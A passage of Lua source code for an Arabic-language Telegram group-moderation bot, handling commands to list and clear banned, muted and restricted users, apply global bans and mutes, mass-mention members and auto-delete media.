if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• لا يوجد "..text:gsub('ال',"").."*").yu,"md",true)  
return false
end  
for k, v in pairs(Info_) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
t = t.."*"..k.." • *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
t = t.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,t).yu,"md",true)  
end
if text == 'المقيدين' then
t = '\n*• قائمه '..text..'  \n ━━━━━━━━━━━ *\n'
local Info_ = redis:smembers(bot_id..":"..msg.chat_id..":restrict") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• لا يوجد "..text:gsub('ال',"").."*").yu,"md",true)  
return false
end  
for k, v in pairs(Info_) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
t = t.."*"..k.." • *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
t = t.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,t).yu,"md",true)  
end
if text == 'المحظورين' then
t = '\n*• قائمه '..text..'  \n━━━━━━━━━━━ *\n'
local Info_ = redis:smembers(bot_id..":"..msg.chat_id..":Ban") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙لا يوجد "..text:gsub('ال',"").."*").yu,"md",true)  
return false
end  
for k, v in pairs(Info_) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
t = t.."*"..k.." • *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
t = t.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,t).yu,"md",true)  
end
if text == 'مسح المحظورين' and Owner(msg) then
local Info_ = redis:smembers(bot_id..":"..msg.chat_id..":Ban") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم مسح "..text:gsub('مسح',"").." سابقاً*").yu,"md",true)  
return false
end  
for k, v in pairs(Info_) do
bot.setChatMemberStatus(msg.chat_id,v,'restricted',{1,1,1,1,1,1,1,1,1})
end
redis:del(bot_id..":"..msg.chat_id..":Ban") 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• تم "..text.." *").yu,"md",true)  
end
if text == 'مسح المطرودين' then
if not Owner(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص المدير* ',"md",true)  
end
if msg.can_be_deleted_for_all_users == false then
return bot.sendText(msg.chat_id,msg.id,"\n*• عذراً البوت ليس ادمن في المجموعة يرجى رفعه وتفعيل الصلاحيات له *","md",true)  
end
if GetInfoBot(msg).BanUser == false then
return bot.sendText(msg.chat_id,msg.id,'\n*• البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
end
local Info_Members = bot.getSupergroupMembers(msg.chat_id, "Banned", "*", 0, 200)
x = 0
local y = false
local List_Members = Info_Members.members
for k, v in pairs(List_Members) do
UNBan_Bots = bot.setChatMemberStatus(msg.chat_id,v.member_id.user_id,'restricted',{1,1,1,1,1,1,1,1,1})
if UNBan_Bots.luatele == "ok" then
x = x + 1
y = true
end
end
if y == true then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم لغيت الحظر عن "..x.." عضو *").by,"md",true)
else
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙مافي مطرودين *").helo,"md",true)
end
end
if text == 'مسح المحذوفين' then
if not Owner(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص المدير* ',"md",true)  
end
if msg.can_be_deleted_for_all_users == false then
return bot.sendText(msg.chat_id,msg.id,"\n*• عذراً البوت ليس ادمن في المجموعة يرجى رفعه وتفعيل الصلاحيات له *","md",true)  
end
if GetInfoBot(msg).BanUser == false then
return bot.sendText(msg.chat_id,msg.id,'\n*• البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
end
local Info_Members = bot.searchChatMembers(msg.chat_id, "*", 200)
local List_Members = Info_Members.members
x = 0
local y = false
for k, v in pairs(List_Members) do
local UserInfo = bot.getUser(v.member_id.user_id)
if UserInfo.type.luatele == "userTypeDeleted" then
local userTypeDeleted = bot.setChatMemberStatus(msg.chat_id,v.member_id.user_id,'banned',0)
if userTypeDeleted.luatele == "ok" then
x = x + 1
y = true
end
end
end
if y == true then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم طردت "..x.." حساب محذوف *").by,"md",true)
else
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙مافي محذوفين *").helo,"md",true)
end
end
if text == 'مسح المكتومين' and Owner(msg) then
local Info_ = redis:smembers(bot_id..":"..msg.chat_id..":silent") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم مسح "..text:gsub('مسح',"").." سابقاً*").yu,"md",true)  
return false
end  
redis:del(bot_id..":"..msg.chat_id..":silent") 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• تم "..text.." *").yu,"md",true)  
end
if text == 'مسح المقيدين' and Owner(msg) then
local Info_ = redis:smembers(bot_id..":"..msg.chat_id..":restrict") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم مسح "..text:gsub('مسح',"").." سابقاً*").yu,"md",true)  
return false
end  
for k, v in pairs(Info_) do
bot.setChatMemberStatus(msg.chat_id,v,'restricted',{1,1,1,1,1,1,1,1,1})
end
redis:del(bot_id..":"..msg.chat_id..":restrict") 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• تم "..text.." *").yu,"md",true)  
end
end
if devB(msg.sender.user_id)  then
if text and text:match('^كتم عام (%d+)$') and tonumber(msg.reply_to_message_id) == 0 then
local UserName = text:match('^كتم عام (%d+)$')
local UserInfo = bot.getUser(UserName)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
if not Isrank(UserName,msg.chat_id) then
t = "*↯︙عذرا لايمكن  اكتم "..Get_Rank(UserName,msg.chat_id).." عام*"
else
t = "*↯︙تم كتمه عام*"
redis:sadd(bot_id..":bot:silent",UserName)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserName,t).helo,"md",true)    
end
if text and text:match('^كتم عام @(%S+)$') then
local UserName = text:match('^كتم عام @(%S+)$')
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
bot.sendText(msg.chat_id,msg.id,"*• اليوزر ليس لحساب شخصي تأكد منه*","md",true)  
return false
end
if UserId_Info.type.is_channel == true then
bot.sendText(msg.chat_id,msg.id,"*• اليوزر لقناه او المجموعه تأكد منه*","md",true)  
return false
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
bot.sendText(msg.chat_id,msg.id,"*• عذرا يجب ان تستخدم معرف لحساب شخصي فقط*","md",true)  
return false
end
if not Isrank(UserId_Info.id,msg.chat_id) then
t = "*↯︙عذرا لايمكن  اكتم "..Get_Rank(UserId_Info.id,msg.chat_id).." عام*"
else
t = "*↯︙تم كتمه عام*"
redis:sadd(bot_id..":bot:silent",UserId_Info.id)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserId_Info.id,t).helo,"md",true)    
end
if text == "كتم عام" and tonumber(msg.reply_to_message_id) ~= 0 then
local Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = bot.getUser(Remsg.sender.user_id)
if UserInfo.message == "Invalid user ID" then
bot.sendText(msg.chat_id,msg.id,"\n*• عذراً تستطيع فقط استخدام الامر على المستخدمين*","md",true)  
return false
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
bot.sendText(msg.chat_id,msg.id,"\n*• عذراً لا تستطيع استخدام الامر على البوت*","md",true)  
return false
end
if not Isrank(Remsg.sender.user_id,msg.chat_id) then
t = "*↯︙عذرا لايمكن  اكتم "..Get_Rank(Remsg.sender.user_id,msg.chat_id).." عام*"
else
t = "*↯︙تم كتمه عام*"
redis:sadd(bot_id..":bot:silent",Remsg.sender.user_id)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(Remsg.sender.user_id,t).helo,"md",true)    
end
if text and text:match('^الغاء الكتم عام (%d+)$') and tonumber(msg.reply_to_message_id) == 0 then
local UserName = text:match('^الغاء الكتم عام (%d+)$')
local UserInfo = bot.getUser(UserName)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
t = "*↯︙تم لغيت كتمه عام *"
redis:srem(bot_id..":bot:silent",UserName)
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserName,t).helo,"md",true)    
end
if text and text:match('^الغاء الكتم عام @(%S+)$') then
local UserName = text:match('^الغاء الكتم عام @(%S+)$')
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
bot.sendText(msg.chat_id,msg.id,"*• اليوزر ليس لحساب شخصي تأكد منه*","md",true)  
return false
end
if UserId_Info.type.is_channel == true then
bot.sendText(msg.chat_id,msg.id,"*• اليوزر لقناه او المجموعه تأكد منه*","md",true)  
return false
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
bot.sendText(msg.chat_id,msg.id,"*• عذرا يجب ان تستخدم معرف لحساب شخصي فقط*","md",true)  
return false
end
t = "*↯︙تم لغيت كتمه عام *"
redis:srem(bot_id..":bot:silent",UserId_Info.id)
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserId_Info.id,t).helo,"md",true)  
end
if text == "الغاء الكتم عام" and tonumber(msg.reply_to_message_id) ~= 0 then
local Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = bot.getUser(Remsg.sender.user_id)
if UserInfo.message == "Invalid user ID" then
bot.sendText(msg.chat_id,msg.id,"\n*• عذراً تستطيع فقط استخدام الامر على المستخدمين*","md",true)  
return false
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
bot.sendText(msg.chat_id,msg.id,"\n*• عذراً لا تستطيع استخدام الامر على البوت*","md",true)  
return false
end
t = "*↯︙تم لغيت كتمه عام *"
redis:srem(bot_id..":bot:silent",Remsg.sender.user_id)
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,t).helo,"md",true)  
end
if text and text:match('^الغاء كتم عام (%d+)$') and tonumber(msg.reply_to_message_id) == 0 then
local UserName = text:match('^الغاء كتم عام (%d+)$')
local UserInfo = bot.getUser(UserName)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
t = "*↯︙تم لغيت كتمه عام *"
redis:srem(bot_id..":bot:silent",UserName)
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserName,t).helo,"md",true)    
end
if text and text:match('^الغاء كتم عام @(%S+)$') then
local UserName = text:match('^الغاء كتم عام @(%S+)$')
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
bot.sendText(msg.chat_id,msg.id,"*• اليوزر ليس لحساب شخصي تأكد منه*","md",true)  
return false
end
if UserId_Info.type.is_channel == true then
bot.sendText(msg.chat_id,msg.id,"*• اليوزر لقناه او المجموعه تأكد منه*","md",true)  
return false
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
bot.sendText(msg.chat_id,msg.id,"*• عذرا يجب ان تستخدم معرف لحساب شخصي فقط*","md",true)  
return false
end
t = "*↯︙تم لغيت كتمه عام *"
redis:srem(bot_id..":bot:silent",UserId_Info.id)
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserId_Info.id,t).helo,"md",true)  
end
if text == "الغاء كتم عام" and tonumber(msg.reply_to_message_id) ~= 0 then
local Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = bot.getUser(Remsg.sender.user_id)
if UserInfo.message == "Invalid user ID" then
bot.sendText(msg.chat_id,msg.id,"\n*• عذراً تستطيع فقط استخدام الامر على المستخدمين*","md",true)  
return false
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
bot.sendText(msg.chat_id,msg.id,"\n*• عذراً لا تستطيع استخدام الامر على البوت*","md",true)  
return false
end
t = "*↯︙تم لغيت كتمه عام *"
redis:srem(bot_id..":bot:silent",Remsg.sender.user_id)
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,t).helo,"md",true)  
end
if text == 'المكتومين عام' then
t = '\n*• قائمه '..text..'  \n ━━━━━━━━━━━ *\n'
local Info_ = redis:smembers(bot_id..":bot:silent") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• لا يوجد "..text:gsub('ال',"").."*").yu,"md",true)  
return false
end  
for k, v in pairs(Info_) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
t = t.."*"..k.." • *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
t = t.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,t).yu,"md",true)  
end
if text == 'مسح المكتومين عام' then
local Info_ = redis:smembers(bot_id..":bot:silent") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• تم مسح "..text:gsub('مسح',"").." سابقاً*").yu,"md",true)  
return false
end  
redis:del(bot_id..":bot:silent") 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• تم "..text.." *").yu,"md",true)  
end
if text and text:match('^حظر عام (%d+)$') and tonumber(msg.reply_to_message_id) == 0 then
local UserName = text:match('^حظر عام (%d+)$')
local UserInfo = bot.getUser(UserName)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
if GetInfoBot(msg).BanUser == false then
bot.sendText(msg.chat_id,msg.id,'*• البوت لا يمتلك صلاحيه حظر عام الاعضاء* ',"md",true)  
return false
end
if not Isrank(UserName,msg.chat_id) then
t = "*↯︙عذرا لايمكن  احظر "..Get_Rank(UserName,msg.chat_id).." عام*"
else
t = "*↯︙تم حظرة عام*"
bot.setChatMemberStatus(msg.chat_id,UserName,'banned',0)
redis:sadd(bot_id..":bot:Ban",UserName)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserName,t).helo,"md",true)    
end
if text and text:match('^حظر عام @(%S+)$') then
local UserName = text:match('^حظر عام @(%S+)$')
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
bot.sendText(msg.chat_id,msg.id,"*• اليوزر ليس لحساب شخصي تأكد منه*","md",true)  
return false
end
if GetInfoBot(msg).BanUser == false then
bot.sendText(msg.chat_id,msg.id,'*• البوت لا يمتلك صلاحيه حظر عام الاعضاء* ',"md",true)  
return false
end
if UserId_Info.type.is_channel == true then
bot.sendText(msg.chat_id,msg.id,"*• اليوزر لقناه او المجموعه تأكد منه*","md",true)  
return false
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
bot.sendText(msg.chat_id,msg.id,"*• عذرا يجب ان تستخدم معرف لحساب شخصي فقط*","md",true)  
return false
end
if not Isrank(UserId_Info.id,msg.chat_id) then
t = "*↯︙عذرا لايمكن  احظر "..Get_Rank(UserId_Info.id,msg.chat_id).." عام*"
else
t = "*↯︙تم حظرة عام*"
bot.setChatMemberStatus(msg.chat_id,UserId_Info.id,'banned',0)
redis:sadd(bot_id..":bot:Ban",UserId_Info.id)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserId_Info.id,t).helo,"md",true)    
end
if text == "حظر عام" and tonumber(msg.reply_to_message_id) ~= 0 then
local Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = bot.getUser(Remsg.sender.user_id)
if UserInfo.message == "Invalid user ID" then
bot.sendText(msg.chat_id,msg.id,"\n*• عذراً تستطيع فقط استخدام الامر على المستخدمين*","md",true)  
return false
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
bot.sendText(msg.chat_id,msg.id,"\n*• عذراً لا تستطيع استخدام الامر على البوت*","md",true)  
return false
end
if GetInfoBot(msg).BanUser == false then
bot.sendText(msg.chat_id,msg.id,'*• البوت لا يمتلك صلاحيه حظر عام الاعضاء* ',"md",true)  
return false
end
if not Isrank(Remsg.sender.user_id,msg.chat_id) then
t = "*↯︙عذرا لايمكن  احظر "..Get_Rank(Remsg.sender.user_id,msg.chat_id).." عام*"
else
t = "*↯︙تم حظرة عام*"
bot.setChatMemberStatus(msg.chat_id,Remsg.sender.user_id,'banned',0)
redis:sadd(bot_id..":bot:Ban",Remsg.sender.user_id)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(Remsg.sender.user_id,t).helo,"md",true)    
end
if text and text:match('^الغاء حظر عام (%d+)$') and tonumber(msg.reply_to_message_id) == 0 then
local UserName = text:match('^الغاء حظر عام (%d+)$')
local UserInfo = bot.getUser(UserName)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
t = "*↯︙تم لغيت حظره عام *"
redis:srem(bot_id..":bot:Ban",UserName)
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserName,t).helo,"md",true)    
bot.setChatMemberStatus(msg.chat_id,UserName,'restricted',{1,1,1,1,1,1,1,1,1})
end
if text and text:match('^الغاء حظر عام @(%S+)$') then
local UserName = text:match('^الغاء حظر عام @(%S+)$')
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
bot.sendText(msg.chat_id,msg.id,"*• اليوزر ليس لحساب شخصي تأكد منه*","md",true)  
return false
end
if UserId_Info.type.is_channel == true then
bot.sendText(msg.chat_id,msg.id,"*• اليوزر لقناه او المجموعه تأكد منه*","md",true)  
return false
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
bot.sendText(msg.chat_id,msg.id,"*• عذرا يجب ان تستخدم معرف لحساب شخصي فقط*","md",true)  
return false
end
t = "*↯︙تم لغيت حظره عام *"
redis:srem(bot_id..":bot:Ban",UserId_Info.id)
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserId_Info.id,t).helo,"md",true)  
bot.setChatMemberStatus(msg.chat_id,UserId_Info.id,'restricted',{1,1,1,1,1,1,1,1,1})
end
if text == "الغاء حظر عام" and tonumber(msg.reply_to_message_id) ~= 0 then
local Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = bot.getUser(Remsg.sender.user_id)
if UserInfo.message == "Invalid user ID" then
bot.sendText(msg.chat_id,msg.id,"\n*• عذراً تستطيع فقط استخدام الامر على المستخدمين*","md",true)  
return false
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
bot.sendText(msg.chat_id,msg.id,"\n*• عذراً لا تستطيع استخدام الامر على البوت*","md",true)  
return false
end
t = "*↯︙تم لغيت حظره عام *"
redis:srem(bot_id..":bot:Ban",Remsg.sender.user_id)
bot.sendText(msg.chat_id,msg.id,Reply_Status(Remsg.sender.user_id,t).helo,"md",true)    
bot.setChatMemberStatus(msg.chat_id,Remsg.sender.user_id,'restricted',{1,1,1,1,1,1,1,1,1})
end
if text and text:match('^الغاء الحظر عام (%d+)$') and tonumber(msg.reply_to_message_id) == 0 then
local UserName = text:match('^الغاء الحظر عام (%d+)$')
local UserInfo = bot.getUser(UserName)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
t = "*↯︙تم لغيت حظره عام *"
redis:srem(bot_id..":bot:Ban",UserName)
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserName,t).helo,"md",true)    
bot.setChatMemberStatus(msg.chat_id,UserName,'restricted',{1,1,1,1,1,1,1,1,1})
end
if text and text:match('^الغاء الحظر عام @(%S+)$') then
local UserName = text:match('^الغاء الحظر عام @(%S+)$')
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
bot.sendText(msg.chat_id,msg.id,"*• اليوزر ليس لحساب شخصي تأكد منه*","md",true)  
return false
end
if UserId_Info.type.is_channel == true then
bot.sendText(msg.chat_id,msg.id,"*• اليوزر لقناه او المجموعه تأكد منه*","md",true)  
return false
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
bot.sendText(msg.chat_id,msg.id,"*• عذرا يجب ان تستخدم معرف لحساب شخصي فقط*","md",true)  
return false
end
t = "*↯︙تم لغيت حظره عام *"
redis:srem(bot_id..":bot:Ban",UserId_Info.id)
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserId_Info.id,t).helo,"md",true)  
bot.setChatMemberStatus(msg.chat_id,UserId_Info.id,'restricted',{1,1,1,1,1,1,1,1,1})
end
if text == "الغاء الحظر عام" and tonumber(msg.reply_to_message_id) ~= 0 then
local Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = bot.getUser(Remsg.sender.user_id)
if UserInfo.message == "Invalid user ID" then
bot.sendText(msg.chat_id,msg.id,"\n*• عذراً تستطيع فقط استخدام الامر على المستخدمين*","md",true)  
return false
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
bot.sendText(msg.chat_id,msg.id,"\n*• عذراً لا تستطيع استخدام الامر على البوت*","md",true)  
return false
end
t = "*↯︙تم لغيت حظره عام *"
redis:srem(bot_id..":bot:Ban",Remsg.sender.user_id)
bot.sendText(msg.chat_id,msg.id,Reply_Status(Remsg.sender.user_id,t).helo,"md",true)    
bot.setChatMemberStatus(msg.chat_id,Remsg.sender.user_id,'restricted',{1,1,1,1,1,1,1,1,1})
end
if text == 'المحظورين عام' then
t = '\n*• قائمه '..text..'  \n ━━━━━━━━━━━ *\n'
local Info_ = redis:smembers(bot_id..":bot:Ban") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• لا يوجد "..text:gsub('ال',"").."*").yu,"md",true)  
return false
end  
for k, v in pairs(Info_) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
t = t.."*"..k.." • *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
t = t.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,t).yu,"md",true)  
end
if text == 'مسح المحظورين عام' and Owner(msg) then
local Info_ = redis:smembers(bot_id..":bot:Ban") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• تم مسح "..text:gsub('مسح',"").." سابقاً*").yu,"md",true)  
return false
end  
for k, v in pairs(Info_) do
bot.setChatMemberStatus(msg.chat_id,v,'restricted',{1,1,1,1,1,1,1,1,1})
end
redis:del(bot_id..":bot:Ban") 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• تم "..text.." *").yu,"md",true)  
end
end
----------------------------------------------------------------------------------------------------
if text == '@all' and Administrator(msg) then
if not redis:get(bot_id.."taggg"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id," • التاك معطل من قبل المشرفين","md",true)
end
if redis:get(bot_id..':'..msg.chat_id..':all') then
return bot.sendText(msg.chat_id,msg.id,"*↯︙من شوي عملتم منشن استنى*","md",true) 
end
redis:setex(bot_id..':'..msg.chat_id..':all',60,true)
x = 0
tags = 0
local Info = bot.searchChatMembers(msg.chat_id, "*", 200)
local members = Info.members
if #members <= 9 then
return bot.sendText(msg.chat_id,msg.id,"*↯︙عدد الاعضاء قليل للمنشن*","md",true) 
end
for k, v in pairs(members) do
local UserInfo = bot.getUser(v.member_id.user_id)
if x == 10 or x == tags or k == 0 then
tags = x + 10
t = "#all"
end
x = x + 1
tagname = UserInfo.first_name.."ْ"
tagname = tagname:gsub('"',"")
tagname = tagname:gsub('"',"")
tagname = tagname:gsub("`","")
tagname = tagname:gsub("*","") 
tagname = tagname:gsub("_","")
tagname = tagname:gsub("]","")
tagname = tagname:gsub("[[]","")
t = t.." ~ ["..tagname.."](tg://user?id="..v.member_id.user_id..")"
if x == 10 or x == tags or k == 0 then
local Text = t:gsub('#all,','#all\n')
bot.sendText(msg.chat_id,0,Text,"md",true)  
end
end
end
if text and text:match("^@all (%d+)$") and Administrator(msg) then
local dede = text:match('^@all (%d+)$')
if not redis:get(bot_id.."taggg"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id," • التاك معطل من قبل المشرفين","md",true)
end
if redis:get(bot_id..':'..msg.chat_id..':all') then
return bot.sendText(msg.chat_id,msg.id,"*↯︙من شوي عملتم منشن استنى*","md",true) 
end
redis:setex(bot_id..':'..msg.chat_id..':all',60,true)
x = 0
tags = 0
local Info = bot.searchChatMembers(msg.chat_id, "*", dede)
local members = Info.members
if #members <= 9 then
return bot.sendText(msg.chat_id,msg.id,"*↯︙عدد الاعضاء قليل للمنشن*","md",true) 
end
for k, v in pairs(members) do
local UserInfo = bot.getUser(v.member_id.user_id)
if x == 10 or x == tags or k == 0 then
tags = x + 10
t = "#all"
end
x = x + 1
tagname = UserInfo.first_name.."ْ"
tagname = tagname:gsub('"',"")
tagname = tagname:gsub('"',"")
tagname = tagname:gsub("`","")
tagname = tagname:gsub("*","") 
tagname = tagname:gsub("_","")
tagname = tagname:gsub("]","")
tagname = tagname:gsub("[[]","")
t = t.." ~ ["..tagname.."](tg://user?id="..v.member_id.user_id..")"
if x == 10 or x == tags or k == 0 then
local Text = t:gsub('#all,','#all\n')
bot.sendText(msg.chat_id,0,Text,"md",true)
sleep(1)
end
end
end

if text and text:match("^@all (.*)$") and Administrator(msg) then
if text:match("^@all (.*)$") ~= nil and text:match("^@all (.*)$") ~= "" then
if not redis:get(bot_id.."taggg"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id," • التاك معطل من قبل المشرفين","md",true)
end
TextMsg = text:match("^@all (.*)$")
if redis:get(bot_id..':'..msg.chat_id..':all') then
return bot.sendText(msg.chat_id,msg.id,"*↯︙من شوي عملتم منشن استنى*","md",true) 
end
redis:setex(bot_id..':'..msg.chat_id..':all',60,true)
x = 0
tags = 0
local Info = bot.searchChatMembers(msg.chat_id, "*", 200)
local members = Info.members
if #members <= 9 then
return bot.sendText(msg.chat_id,msg.id,"*↯︙عدد الاعضاء قليل للمنشن*","md",true) 
end
for k, v in pairs(members) do
local UserInfo = bot.getUser(v.member_id.user_id)
if x == 10 or x == tags or k == 0 then
tags = x + 10
t = "#all"
end
x = x + 1
tagname = UserInfo.first_name.."ْ"
tagname = tagname:gsub('"',"")
tagname = tagname:gsub('"',"")
tagname = tagname:gsub("`","")
tagname = tagname:gsub("*","") 
tagname = tagname:gsub("_","")
tagname = tagname:gsub("]","")
tagname = tagname:gsub("[[]","")
t = t.." ~ ["..tagname.."](tg://user?id="..v.member_id.user_id..")"
if x == 10 or x == tags or k == 0 then
local Text = t:gsub('#all,','#all\n')
TextMsg = TextMsg
TextMsg = TextMsg:gsub('"',"")
TextMsg = TextMsg:gsub('"',"")
TextMsg = TextMsg:gsub("`","")
TextMsg = TextMsg:gsub("*","") 
TextMsg = TextMsg:gsub("_","")
TextMsg = TextMsg:gsub("]","")
TextMsg = TextMsg:gsub("[[]","")
bot.sendText(msg.chat_id,0,TextMsg.."\n━━━━━━━━━━━ \n"..Text,"md",true)  
end
end
end
end
--
if msg and msg.content then
if text == 'تنزيل جميع الرتب' and Creator(msg) then   
redis:del(bot_id..":"..msg.chat_id..":Status:BasicConstructor")
redis:del(bot_id..":"..msg.chat_id..":Status:Constructor")
redis:del(bot_id..":"..msg.chat_id..":Status:Owner")
redis:del(bot_id..":"..msg.chat_id..":Status:Administrator")
redis:del(bot_id..":"..msg.chat_id..":Status:Vips")
bot.sendText(msg.chat_id,msg.id,"*• تم "..text.." *","md", true)
end
if msg.content.luatele == "messageSticker" or msg.content.luatele == "messageUnsupported" or msg.content.luatele == "messageContact" or msg.content.luatele == "messageVideoNote" or msg.content.luatele == "messageDocument" or msg.content.luatele == "messageVideo" or msg.content.luatele == "messageAnimation" or msg.content.luatele == "messagePhoto" then
redis:sadd(bot_id..":"..msg.chat_id..":mediaAude:ids",msg.id)  
end
if redis:get(bot_id..":"..msg.chat_id..":settings:mediaAude") then
local gmedia = redis:scard(bot_id..":"..msg.chat_id..":mediaAude:ids")  
if gmedia >= tonumber(redis:get(bot_id..":mediaAude:utdl"..msg.chat_id) or 200) then
local liste = redis:smembers(bot_id..":"..msg.chat_id..":mediaAude:ids")
for k,v in pairs(liste) do
local Mesge = v
if Mesge then
t = "*• تم مسح "..k.." من الوسائط تلقائيا\n• يمكنك تعطيل الميزه باستخدام الامر ( تعطيل المسح التلقائي )*"
bot.deleteMessages(msg.chat_id,{[1]= Mesge})
end
end
bot.sendText(msg.chat_id,msg.id,t,"md",true)
redis:del(bot_id..":"..msg.chat_id..":mediaAude:ids")
end
end
end
if text == 'تفعيل المسح التلقائي' and BasicConstructor(msg) then   
if redis:get(bot_id..":"..msg.chat_id..":settings:mediaAude") then
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." سابقاً*").yu
else
Text = Reply_Status(msg.sender.user_id,"*↯︙تم "..text.." *").by
redis:set(bot_id..":"..msg.chat_id..":settings:mediaAude",true)  
end
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text == 'تعطيل المسح التلقائي' and BasicConstructor(msg) then  
if not redis:get(bot_id..":"..msg.chat_id..":settings:mediaAude") then
